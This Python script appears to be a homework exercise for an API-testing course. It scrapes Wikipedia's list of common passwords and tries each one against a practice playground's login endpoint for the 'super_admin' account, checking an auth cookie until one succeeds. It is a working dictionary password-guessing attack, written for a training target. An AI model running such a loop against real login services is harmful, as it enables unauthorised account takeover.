"""
ex9*
"""

import requests
from bs4 import BeautifulSoup as BFS


def get_top_25_common_pswds() -> set:
    wiki_url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"

    wiki_req = requests.get(wiki_url)

    soup = BFS(wiki_req.text, 'lxml')
    selector = '#mw-content-text > div.mw-parser-output > table:nth-child(10) tr td'
    return {str(tag.string).strip()
            for tag in soup.select(selector) if tag.attrs['align'] != 'center'}


api_get_secret_pswd = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
api_check_auth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = 'super_admin'


def parser_password(passwords):

    for pswd in passwords:
        response = requests.post(api_get_secret_pswd, data={'login': login, 'password': pswd})
        if response.status_code == 500:
            print("Wrong login name:", login)
            return
        else:
            cookies = response.cookies
            check_auth = requests.get(api_check_auth, cookies=cookies)
            if "You are authorized" in check_auth.text:
                print("Your password is: ", pswd)
                return
    print("The correct password was not found :(")


parser_password(get_top_25_common_pswds())
